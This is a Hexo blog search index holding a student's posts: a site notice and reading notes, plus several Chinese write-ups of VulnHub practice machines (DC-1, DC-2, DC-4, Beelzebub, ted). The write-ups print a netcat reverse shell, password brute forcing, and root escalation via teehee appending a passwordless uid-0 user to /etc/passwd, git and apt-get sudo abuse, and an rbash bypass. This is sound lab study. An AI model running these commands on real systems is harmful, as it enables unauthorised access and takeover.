<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>要置顶的公告</title>
    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"><br>2024/1/4 更新:<br>期末考完事了<br>算是顺利进入了寒假阶段</p>
<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
<p>ps:<br>typora的单格换行是<strong>shift+enter</strong> 双格换行才是<strong>enter</strong> 请注意<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong><br>无渲染跳转方式: 在文章前加入</p>
<pre class="line-numbers language-none"><code class="language-none">---
layout: false 
--- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>总感觉kook（撤去一堆控诉他是个怎么抄袭了discord的卑鄙无耻的软件的言论）马上得暴死了</p>
<p>Todolist估计得换一个位置 这里不行 得是<strong>方便修改增加编辑内容</strong>的平台</p>
</body></html>]]></content>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏体验--lethal company</title>
    <url>/2024/01/07/%E6%B8%B8%E6%88%8F%E4%BD%93%E9%AA%8C-lethal-company/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以我又新开了个栏目</p>
<p>老样子 第一次做 先试试水吧</p>
<p>先等今天搓两把整点素材下来</p>
</body></html>]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>摸鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之Beelzebub</title>
    <url>/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是工作室的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：beelzebub</p>
<h2 id="知识点和工具"><a href="#知识点和工具" class="headerlink" title="知识点和工具"></a>知识点和工具</h2><p>wpscan (wordpress环境专用的工具 用于爆破用户名或密码)<br>dirsearch (目录扫描)<br>md5加密<br>目录扫描</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span> 
<p>老样子 发现靶机 扫描端口<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/1.jpg" alt="1"><br>80端口开着 我们访问看两眼<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/2.jpg" alt="2"><br>标准的默认欢迎页面 没什么特别的<br>用扫描目录的工具<strong>dirsearch</strong>找找有没有其他目录<br><code>dirsearch -u [网址]</code><br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/3.jpg" alt="3"><br>在index.php网站内发现隐藏注释<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/4.jpg" alt="4"><br>（大意:我的核心被加密了，”beelzebub”不知为何破解并加密了他 -MD5)<br>说明我们要去的目录与md5加密后的”beelzebub”有联系<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/5.jpg" alt="5"><br>于是我们随便找个<strong>md5加密/解密</strong>网站将beelzebub加密<br>逐一用dirsearch来寻找正确的目录<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/6.jpg" alt="6"><br>最终发现在32位小写加密方式的目录下存在wordpress基站<br>依次查看 发现wp-content/uploads/下存在文件管理系统<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/12.jpg" alt="12"><br>进入Talk To VALAK中<br>发现在输入任何字段后网页会返回一段名为password的cookie<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/7.jpg" alt="7"><br>该密码多半与开放的ssh服务有联系 但用户名未知<br>我们使用wpscan来爆破该网站的用户名</p>
<pre class="line-numbers language-none"><code class="language-none">wpscan -url "[网址]" -e u --ignore-main-redirect --force
-url //指定网址
-e u //爆破用户名
--ignore-main-redirect //忽略主要的重定向
--force //强制执行扫描（这在你确信目标站点是WordPress站点但WPScan未正确检测到的情况下可能会有用）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/8.jpg" alt="8"><br>结果显示有俩用户 分别为<strong>krampus</strong>与<strong>valak</strong><br>经过尝试发现可以使用password中的密码与<strong>krampus</strong>登陆ssh服务<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/9.jpg" alt="9"><br>进去后发现权限不够 需要提权<br>查看<strong>history //历史记录</strong>后发现该账号曾尝试提权<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/10.jpg" alt="10"><br>我们复现过程即可<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/11.jpg" alt="11"><br>获得root权限 结束！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程很短的靶机<br>结合了wordpress与目录扫描<br>已经不止一次见到wordpress了 用wpscan便可以解决大部分的问题<br><strong>那么我们下次见</strong></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记-如何阅读一本书</title>
    <url>/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>经<a href="https://truthleader.github.io/"><del>我们伟大而全能的唯一至高真理教教主</del></a>推荐而读<br>本书下载地址：<a href="https://zh.z-library.se/book/5423134/5e4d46/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6.html">点击这里</a></p>
<hr>
<p>ps:之前没做过这种东西 所以姑且先开一篇试试水<br>这玩意多半得长期更新 边摸边写<br><strong>本书通读进度:5%左右 未完成</strong> </p>
<span id="more"></span>

<h2 id="总之为啥要看呢？"><a href="#总之为啥要看呢？" class="headerlink" title="总之为啥要看呢？"></a>总之为啥要看呢？</h2><p>1.提升看书的效率（用更少的时间来阅读更多的内容）云云</p>
<p>2.很好奇是怎么个”如何阅读”</p>
</body></html>]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4解析</title>
    <url>/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是学校作业哦<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
<hr>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：DC-4<br>网络链接均为Nat模式</p>
<h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>burpsuite （爆破 监听 数据包更改）<br>hydra（爆破用工具）<br>teehee提权</p>
<span id="more"></span>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>照例<br><code>arp-scan -l //发现同网段设备</code><br><code>nmap -p- -A [指定的ip地址] //扫描开放的端口并套用脚本</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>既然开放了80端口 那就访问看看<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>是个登陆页面 说是<strong>admin</strong>信息系统登陆<br>我们用burpsuite爆破密码试试<br>调整firefox与burpsuite的proxy设定 我们开启监听 <strong>send to intruder</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>用攻击类型Cluster bomb来爆破 字典选择kali中自带的/usr/share/john/password.lst</p>
<blockquote>
<p>坑:本来想用rockyou.txt的 行数太多常常导致burpsuite的崩溃</p>
</blockquote>
<p>注意该lst文件前面会有几行注释 选中后点击左边的remove即可<br>因为使用的是Cluster bomb需要给两个<strong>payload</strong>都加上内容<br>我们切换<strong>payload set</strong>继续导入词库<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>ok了 点击右上角按钮开始攻击<br>嫌速度慢的可以在Resource pool中更改线程<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/5.jpg" alt="5"><br>经过极其漫长的等待<br>结果出来了<br>账号名为<strong>admin</strong> 密码为<strong>happy</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>我们用这套账号密码登陆进入网站<br>网站里面有一些命令可以执行 但都是固定的<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们用burpsuite抓包 尝试修改命令<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/9.jpg" alt="9"><br>我们把命令改成<strong>ipconfig</strong><br>可以看到照样成功运行了<br>既然运行命令可行 那就利用nc(瑞士军刀)反弹shell吧<br>在kali端运行<code>nc -lnvp 1234 //于1234端口开始监听</code><br>在burpsuite中将命令改为<code>nc [kali的ip地址] [端口] -e /bin/sh //反弹shell</code><br>点击send 成功反弹<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>利用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>优化交互页面<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>在根目录的home目录下使用<code>ls -alR</code>递归显示所有目录与隐藏文件<br>在jim目录底下发现名为old-passwords.bak的文件<br>联系一开始端口扫描中开放的22端口<br>我们需要尝试登陆ssh服务<br>至于如何把该文件中的内容传回来 直接复制粘贴即可<br>账号名为<strong>jim</strong> 密码目录使用复制粘贴的密码目录<br>工具为hydra<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br><code>hydra -l [用户名] -P [密码字典目录] [服务名：//ip地址]</code><br>我们稍等片刻 结果出来了<br><code>[22][ssh] host: 192.168.246.142   login: jim   password: jibril04</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>登陆完毕 嘻嘻<br>一进来系统就说<strong>you have mail</strong><br>那我们找找这封邮件在哪里</p>
<pre class="line-numbers language-none"><code class="language-none">find [寻找范围] -name [想找的文件名称] 2&gt;/dev/null
2&gt;/dev/null 不输出报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/14.jpg" alt="14"><br>发现在**/var/mail**目录里边有一封信件<br>(大意:jim 我这周要去休假 老板叫我给你我的密码 免得有要紧事 拜拜）<br>有了charles的账号密码 我们切换一下账号<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>成功进入 我们sudo -l查看该用户的sudo权限<br>发现他可以以root权限免密码执行 /usr/bin/teehee<br>那就通过teehee提权的方式来获取权限</p>
<blockquote>
<p>参考：<a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee提权</a><br>teehee是个小众的linux编辑器 如果有sudo权限 可以利用其来提权<br>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p>
<pre class="line-numbers language-none"><code class="language-none">echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su admin就可以登录到admin用户，这个用户因为uid为0，所以也是root权限</p>
</blockquote>
<p>我们安装教程 输入<code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code><br>随后便能不使用密码<strong>su admin</strong><br>flag自然在/root目录之下<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/16.jpg" alt="16"><br>成功！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识点比较少 短小精悍的靶机<br>那我们下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2解析</title>
    <url>/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是学校作业<br>下载地址:<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-2<br>网络链接均为Nat模式</p>
<h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>wpscan (WordPress爆破用)<br>MSF console (漏洞检索&amp;调用)<br>dirb (目录扫描)<br>cewl (给url生成密码目录)<br>绕过bash限制<br>git 提权</p>
<span id="more"></span>

<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>国际惯例 <code>arp-scan -l</code>发现同网段设备 使用<strong>nmap</strong>扫描ip开放的端口<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>我们访问网站 发现无法访问<br>这里需要修改hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">vim /etc/hosts //编辑 随后另起一行 输入[靶机的ip地址] [dc-2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这么一改 这个ip就和dc-2绑定了 重定向也不会出错<br>进入网站 发现网站是wordpress框架<br>里面翻了一遍 没啥隐藏的玩意 只有一个flag<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>[大意:通常的密码表爆破估计不会有用 你估计得要变得cewl(特指工具名) 登录网站来获取下个flag 如果没有 就换个账号]<br>那我们现在的目标转向wordpress的账号密码获取与登录页面的寻找(毕竟有账号密码没得登录怎么办呢)<br>我们先利用<strong>msfconsole</strong>中的目录扫描工具(关键词dir_scan)</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole //启用msfconsole
search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)
配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞
也可以直接use/info+[漏洞Name]
set RHOSTS [需要爆破的ip] //指定目标
run //执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>找到了 wp-includes 但里面的文件实在太多 使用<strong>dirb</strong>再次扫描 缩小范围吧<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"></p>
<p>[-X 限制文件后缀]<br><strong>发现了登陆页面(wp-login.php)</strong></p>
<p>账号方面使用wpscan获取</p>
<blockquote>
<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p>
<pre class="line-numbers language-常用选项" data-language="常用选项"><code class="language-常用选项">&gt;--update  更新到最新版本
&gt;--url   | -u &lt;target url&gt;  要扫描的`WordPress`站点.
&gt;--force | -f   不检查网站运行的是不是`WordPress`
&gt;--enumerate | -e [option(s)]  枚举
&gt;u 枚举用户名，默认从1-10
&gt;u[10-20] 枚举用户名，配置从10-20
&gt;--username | -U &lt;username指定爆破的用户名
&gt;--wordlist | -w &lt;wordlist指定密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>这里用到枚举功能 发现有3个用户名 分别是<strong>admin jerry tom</strong></p>
<p><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/5.jpg" alt="5"></p>
<p>我们生成一个用户名表 把这仨放进去 方便后面爆破<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br>密码方面遵从flag的提示 使用cwel工具<br><code>cwel [网址]  -w [生成文件名]</code><br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>随后用户名表有了 密码表也有了 我们用wpscan来爆破一下<br><code>wpscan --url [网址] -U [用户名表] -P [密码表] </code><br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"></p>
<p>找出了tom与jerry的密码<br>我们进入登陆页面 发现jerry账号处有flag<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/9.jpg" alt="9"><br>[大意：换个捷径 也就是另一个入口试试看吧]<br>那么我们就能想到刚刚开放的7744端口对应了ssh服务 尝试登陆<br>发现用刚才爆破出的tom账号密码可以登陆<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>登陆后发现tom用户无法执行系统指令 用户默认shell为rbash </p>
<pre class="line-numbers language-none"><code class="language-none">绕过bash限制(这里基本看不懂就把原教程贴上来吧嘻嘻)
BASH_CMDS[a]=/bin/sh
a/bin/bashexport
PATH=$PATH:/binexport 
PATH=$PAH:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在执行了绕过后 通过查看文件发现flag3<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>[大意：可怜的老tom老追着jerry跑 也许需要su一下？]<br>我们su jerry来切换用户<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>切换之后就找到了flag4<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>[大意：最后一个flag才算数哦 用git逃出这里吧]<br>jerry的权限不足以访问/root 看来是需要git 提权了</p>
<blockquote>
<p>参考:<a href="https://blog.csdn.net/qq_38612882/article/details/122772867">csdn-2022-渗透测试-git提权（Linux）</a></p>
<pre class="line-numbers language-none"><code class="language-none">sudo git help config
	!/bin/bash或者！'sh'完成提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</blockquote>
<p>这样操作完之后就能访问root了<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"><br>完事！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>dc这个系列的靶机好像就是每期针对一个不同类型的博客框架进行拆解啊<br>wordpress之前接触过所以还算好说<br><em><strong>那我们下次见吧</strong></em></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之ted</title>
    <url>/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>上周欠的工作室的靶机<br>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：ted （192.168.246.139）</p>
<h2 id="相关工具-知识"><a href="#相关工具-知识" class="headerlink" title="相关工具&amp;知识"></a>相关工具&amp;知识</h2><p>burpsuite (渗透测试工具)<br>远程文件包含<br>sha256加密</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>

<p>惯例发现靶机扫描端口<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/1.jpg" alt="1"><br>发现80端口开放 通过firefox访问<br>发现主页面是一个登录页面 使用burpsuite爆破账号密码<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/2.jpg" alt="2"><br>发现当admin为账号时弹回提示”密码hash值可能不对 请尝试hash加密”<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/3.jpg" alt="3"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/4.jpg" alt="4"><br>我们确定账号名为admin 密码通过其他工具进行各种形式的加密 随后尝试爆破<br>发现密码形式为sha256加密 且字母为大写<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/5.jpg" alt="5"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/6.jpg" alt="6"><br>登录进去之后发现只有一个搜索框 测试后发现存在xss漏洞<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/7.jpg" alt="7"><br>尝试/etc/passwd发现存在远程包含漏洞 通过nc监听反弹shell<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/8.jpg" alt="8"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/9.jpg" alt="9"><br>（尝试读取到当前admin的session，PHP的session保存在：/var/lib/php/session/sess_sessionid)<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/10.jpg" alt="10"><br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/11.jpg" alt="11"><br>成功反弹到shell 发现权限为www-data 使用<code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code>提权<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/12.jpg" alt="12"><br>完成<br><img data-src="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/13.jpg" alt="13"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好短一靶机…<br>但作为复习来说也算不错<br>那我们下次见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机-DC-1</title>
    <url>/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p><strong>下载地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></strong><br>跟随课程所写的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-1<br>网络链接均为Nat模式</p>
<h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识&amp;工具"></a>相关知识&amp;工具</h2><p>MSFconsole (漏洞检索与执行)<br>MySQL数据库相关<br>hash加密<br>find suid提权</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span>
<p><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/1.jpg" alt="1"><br>惯例 <code>arp-scan -l //快速发现同网段设备</code><br><code>nmap -p- -A [ip地址] //扫描端口并调用默认脚本</code><br>发现开放了<code>对应ssh服务的22端口 对应http服务的80端口 对应rpcbind的111端口</code><br>总之我们先通过Firefox访问该ip试试看<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/2.jpg" alt="2"><br>是个 <strong>drupal</strong> 网站 网站元素内没有隐藏要素 我们尝试通过注册账号来登录 发现无法注册<br>那就只有通过各种方式来获取账号密码登录网站了<br>我们先前说过 这是个<strong>drupal</strong>模板网站 在msfconsole中一定能找到不少漏洞<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/3.jpg" alt="3"><br>寻找的时候我们看到这个<strong>drupal_drupageddon</strong>可以使用 于是加载</p>
<pre class="line-numbers language-kali哦哦" data-language="kali哦哦"><code class="language-kali哦哦">msfconsole //启用msfconsole
search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)
配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞
也可以直接use/info+[漏洞Name]
set RHOSTS [需要爆破的ip] //指定目标
run //执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随后我们输入<strong>shell</strong> 很快就能反弹到一个shell<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/4.jpg" alt="4"><br>使用之前介绍过的<code>python -c 'import pty; pty.spawn("/bin/bash")' //改善shell交互性</code><br>寻找flag文件 很快的就能发现根目录下的<strong>flag1.txt</strong><br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/5.jpg" alt="5"><br>它提示我说每个文件管理系统都需要一个<strong>设置文件</strong>——<strong>你也是</strong><br>也就是说接下来的内容处于这个网站的<strong>设置文件</strong>中<br>很明显**/sites/default/settings.php<strong>里有点什么玩意<br>查看后发现了 <strong>flag2</strong> 与 <strong>该网站mysql数据库的一套账号密码</strong><br>那就</strong>登录mysql**查看主网站的账号密码<br><img data-src="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/6.jpg" alt="6"></p>
<pre class="line-numbers language-none"><code class="language-none">这个靶机需要用到的 不太全的mysql相关指令
